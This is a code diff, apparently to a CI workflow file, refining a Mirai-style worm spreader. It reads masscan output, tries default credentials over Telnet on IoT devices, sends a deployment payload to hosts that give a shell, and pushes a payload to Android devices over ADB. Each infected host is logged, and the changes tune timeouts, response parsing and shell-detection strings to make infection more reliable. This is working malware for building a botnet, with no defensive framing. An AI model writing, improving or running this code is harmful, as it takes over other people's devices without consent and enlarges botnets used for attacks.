@@ -92,27 +92,44 @@ jobs:
               for user, pw in MIRAI:
                   try:
                       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                      s.settimeout(5)
+                      s.settimeout(6)
                       s.connect((ip, port))
-                      s.recv(512)
+                      # Read banner + login prompt (may arrive in multiple packets)
+                      try: s.recv(512)
+                      except: pass
+                      # Send user+pass rapidly (IoT Telnet buffers both, no sleep needed)
                       s.send(f"{user}\n".encode())
-                      time.sleep(0.3)
                       s.send(f"{pw}\n".encode())
-                      time.sleep(0.3)
-                      resp = s.recv(1024).lower()
-                      # shell indicators minus failure strings
-                      hits = [b"#", b"$", b">", b"busybox", b"login:", b"welcome",
-                              b"shell", b"sh ", b"/ #", b"~ #", b"/ $"]
+                      # IoT devices are SLOW — give them time to process and respond
+                      time.sleep(0.8)
+                      # Read response — may need multiple recv calls
+                      resp = b""
+                      for _ in range(3):
+                          try:
+                              chunk = s.recv(4096)
+                              if chunk: resp += chunk
+                              else: break
+                          except: break
+                      resp_lower = resp.lower()
+                      # Shell indicators (NO "login:" — too broad, false positives)
+                      hits = [b"#", b"$", b">", b"busybox", b"welcome",
+                              b"shell", b"sh ", b"/ #", b"~ #", b"/ $", b"root@"]
                       fails = [b"incorrect", b"invalid", b"wrong", b"denied",
-                               b"failed", b"bad", b"error", b"refused"]
-                      if any(h in resp for h in hits) and not any(f in resp for f in fails):
-                          s.send(b"sh\n"); time.sleep(0.3); s.recv(256)
+                               b"failed", b"bad", b"error", b"refused", b"disable"]
+                      if any(h in resp_lower for h in hits) and not any(f in resp_lower for f in fails):
+                          s.send(b"sh\n"); time.sleep(0.4)
+                          try: s.recv(256)
+                          except: pass
                           s.send(f"{DEPLOY}\n".encode()); time.sleep(0.5)
                           s.close()
                           with lock: infected.append(f"TELNET:{ip}:{port}:{user}:{pw}")
+                          sys.stderr.write(f"INFECTED TELNET {ip}:{port} {user}:{pw}\n")
+                          sys.stderr.flush()
                           return True
                       s.close()
-                  except:
+                  except Exception as e:
+                      sys.stderr.write(f"TELNET ERR {ip}:{port} {user}:{pw}: {e}\n")
+                      sys.stderr.flush()
                       pass
               return False
 
@@ -133,20 +150,26 @@ jobs:
                                          capture_output=True, timeout=10)
                           subprocess.run(["adb", "disconnect", target], capture_output=True)
                           with lock: infected.append(f"ADB:{ip}")
+                          sys.stderr.write(f"INFECTED ADB {ip}:5555\n")
+                          sys.stderr.flush()
                           return True
                   subprocess.run(["adb", "disconnect", target],
                                  capture_output=True, timeout=3)
-              except:
+              except Exception as e:
+                  sys.stderr.write(f"ADB ERR {ip}: {e}\n")
+                  sys.stderr.flush()
                   pass
               return False
 
           # Parse masscan -oG output and launch threads
           threads = []
+          host_count = 0
           with open(SCANFILE) as f:
               for line in f:
                   if line.startswith("#"): continue
                   m = re.match(r"Host:\s*(\S+)\s+.*Ports:\s*(.+)", line)
                   if not m: continue
+                  host_count += 1
                   ip = m.group(1)
                   ports_str = m.group(2)
                   for port_match in re.finditer(r"(\d+)/open", ports_str):
@@ -158,8 +181,11 @@ jobs:
                           t = threading.Thread(target=telnet_exploit, args=(ip, port), daemon=True)
                           t.start(); threads.append(t)
 
+          sys.stderr.write(f"exploit.py: {host_count} hosts, {len(threads)} threads spawned\n")
+          sys.stderr.flush()
+
           for t in threads:
-              t.join(timeout=30)
+              t.join(timeout=35)
 
           # Write results
           with open(OUTFILE, "w") as f:
